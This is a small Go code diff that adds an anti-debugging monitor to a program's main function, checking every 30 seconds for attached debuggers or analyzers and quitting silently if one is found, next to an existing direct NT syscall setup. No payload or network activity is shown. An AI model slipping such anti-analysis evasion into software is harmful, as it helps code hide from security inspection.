@@ -86,6 +86,11 @@ func main() {
 		log.Printf("Warning: NT syscall init failed, falling back to standard API: %v", ntErr)
 	}
 
+	// Anti-debug: periodic checks for attached debuggers/analyzers
+	ntapi.StartAntiDebugMonitor(30*time.Second, func() {
+		os.Exit(0)
+	})
+
 	err := config.Load()
 	if err != nil {
 		utils.ShowDialog("Error loading configuration", err.Error())
